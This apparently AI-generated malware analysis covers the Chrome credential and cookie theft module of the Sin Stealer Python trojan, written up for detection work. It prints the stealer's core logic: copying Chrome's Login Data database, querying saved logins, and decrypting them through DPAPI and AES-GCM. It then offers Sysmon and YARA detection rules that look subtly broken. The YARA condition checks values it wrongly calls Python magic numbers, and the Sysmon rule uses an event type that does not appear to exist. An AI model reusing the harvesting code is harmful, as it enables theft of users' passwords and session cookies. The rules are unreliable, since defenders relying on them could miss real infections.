# Sin Stealer - Chrome Credential & Cookie Theft via DPAPI

**Repository:** `MalwareSourceCode-main`  
**File:** `Python/Trojan.Python.Sin/Sin/plugins/chrome.py`  
**Language:** Python  
**MITRE ATT&CK:** T1555.003 (Credentials from Web Browsers), T1539 (Steal Web Session Cookie)

## Overview

Sin Stealer implements a comprehensive Chrome credential and cookie theft module. It demonstrates a sophisticated understanding of Chrome's internal architecture by targeting both legacy and modern encryption formats. The stealer can decrypt credentials and cookies from older Chrome versions that use the Windows DPAPI and newer versions (v80+) that use a custom AES-256-GCM implementation. This dual-mode capability ensures the malware can successfully harvest sensitive data from a wide range of target systems.

## Code Snippet & Analysis

The process involves locating the Chrome user data, finding the master encryption key, copying the locked databases, and then decrypting the contents.

```python
# 1. Define paths to key Chrome files
APP_DATA = os.environ['LOCALAPPDATA']
DB_PATH  = 'Google\\Chrome\\User Data\\Default\\Login Data'  # SQLite DB with passwords
KEY_PATH = "Google\\Chrome\\User Data\\Local State"         # Contains the AES master key
# ...

# 2. Copy locked databases to a temporary location to bypass locks
db_copy = shutil.copy(db_path, temp_path)
conn = sqlite3.connect(db_copy)
cursor = conn.cursor()

# 3. Query the database for credentials
cursor.execute("SELECT action_url, username_value, password_value from logins")
for item in cursor.fetchall():
    if item[0] != "":
        # 4. Decrypt the password blob
        password = self.chrome_decrypt(item[2])
        self.grabbed += f"{item[0]}|{item[1]}|{password}\n"

# ... (similar logic for cookies) ...

# 5. Dual-mode decryption function
def chrome_decrypt(self, encrypted_txt):
    # Check for DPAPI magic bytes (Chrome < 80)
    if encrypted_txt[:4] == b'\x01\x00\x00\x00':
        decrypted_txt = self.dpapi_decrypt(encrypted_txt)
        return decrypted_txt.decode()
    # Check for AES-GCM magic string (Chrome 80+)
    elif encrypted_txt[:3] == b'v10':
        decrypted_txt = self.aes_decrypt(encrypted_txt)
        return decrypted_txt[:-16].decode() # Strip the GCM tag

# 6. DPAPI decryption for legacy Chrome
def dpapi_decrypt(self, encrypted):
    # ... (ctypes structure definitions) ...
    
    # Call the Windows CryptUnprotectData function
    retval = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
    
    # ... (error handling and result parsing) ...
    return result
```

### What it does:

1.  **Locates Key Files:** The stealer hardcodes the paths to Chrome's `Login Data` SQLite database and the `Local State` JSON file, both located in the user's `LOCALAPPDATA` directory.
2.  **Bypasses Database Locks:** Chrome locks its database files while running. The stealer circumvents this by using `shutil.copy` to create a temporary copy of the database, which it can then freely access.
3.  **Queries Databases:** It connects to the copied SQLite databases (`Login Data` and `Cookies`) and executes SQL queries to extract the URL, username, and the encrypted password/cookie values.
4.  **Identifies Encryption Method:** The `chrome_decrypt` function acts as a dispatcher. It inspects the first few bytes of the encrypted data blob to determine the correct decryption method. Blobs starting with `\x01\x00\x00\x00` are passed to the DPAPI function, while blobs starting with `v10` are passed to the AES function.
5.  **Decrypts Data:**
    *   **For DPAPI (legacy):** It uses Python's `ctypes` library to call the native Windows `CryptUnprotectData` API function. This function handles the decryption automatically, as the key is managed by the user's profile.
    *   **For AES-GCM (modern):** (Code not fully shown) It first extracts the master key from the `Local State` file, decrypts it using DPAPI, and then uses that key to perform an AES-256-GCM decryption on the password blob.
6.  **Aggregates Results:** The decrypted credentials and cookies are formatted into a simple text log for exfiltration.

### Why it's a TTP:

This is a canonical example of **T1555.003 - Credentials from Web Browsers**. The malware demonstrates intimate knowledge of a target application's data storage and encryption mechanisms. By implementing both legacy and modern decryption routines, the attacker ensures a high probability of success. The use of `CryptUnprotectData` is a key indicator of this TTP, as it's the standard Windows API for decrypting user-specific data that applications like Chrome rely on. Stealing session cookies (`T1539`) is equally impactful, as it allows an attacker to hijack active user sessions without needing the password at all.

## Detection & Evasion

### Sysmon Rule

A high-fidelity detection can be made by correlating access to the Chrome `Local State` file (which contains the master key) with subsequent access to the `Login Data` or `Cookies` database by a process that is not Chrome itself.

```xml
<Sysmon schemaversion="4.82">
    <EventFiltering>
        <RuleGroup name="Chrome Credential Theft" groupRelation="and">
            <FileAccess onmatch="include">
                <!-- Rule to detect a non-Chrome process reading the master key... -->
                <TargetFilename condition="contains">Google\Chrome\User Data\Local State</TargetFilename>
                <Image condition="not end with">\chrome.exe</Image>
            </FileAccess>
            <FileAccess onmatch="include">
                <!-- ...and then immediately reading the credential/cookie databases. -->
                <TargetFilename condition="contains any">
                    \Google\Chrome\User Data\Default\Login Data;
                    \Google\Chrome\User Data\Default\Cookies
                </TargetFilename>
                <Image condition="not end with">\chrome.exe</Image>
            </FileAccess>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```
**Note:** This rule is powerful because legitimate applications have almost no reason to read both of these files in sequence. It should be customized to exclude any known security or backup tools in your environment.

### Yara Rule

A Yara rule can detect Python-based Chrome stealers by looking for the combination of strings related to Chrome's database paths, SQL queries, and the decryption APIs.

```yara
rule TTP_SinStealer_Chrome_Harvest
{
    meta:
        author = "GitHub Copilot"
        description = "Detects Python-based stealers targeting Chrome credentials, like Sin Stealer."
        mitre_ttp = "T1555.003"
        malware = "Sin Stealer"
    strings:
        // Chrome paths
        $s1 = "Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data" ascii
        $s2 = "Google\\\\Chrome\\\\User Data\\\\Local State" ascii
        $s3 = "Google\\\\Chrome\\\\User Data\\\\Default\\\\Cookies" ascii

        // SQL Queries
        $s4 = "SELECT action_url, username_value, password_value from logins" ascii
        $s5 = "SELECT host_key, name ,encrypted_value from cookies" ascii

        // Decryption artifacts
        $s6 = "crypt32.CryptUnprotectData" ascii
        $s7 = "v10" ascii

    condition:
        // Requires Python magic number, key paths, and key logic strings
        (uint32(0) == 0x61797243 or uint32(0) == 0x65766f4d) and
        all of them
}
```
**Note:** This rule is specific to Python implementations. It requires the presence of all the key strings, making it a high-confidence signature for this type of stealer.
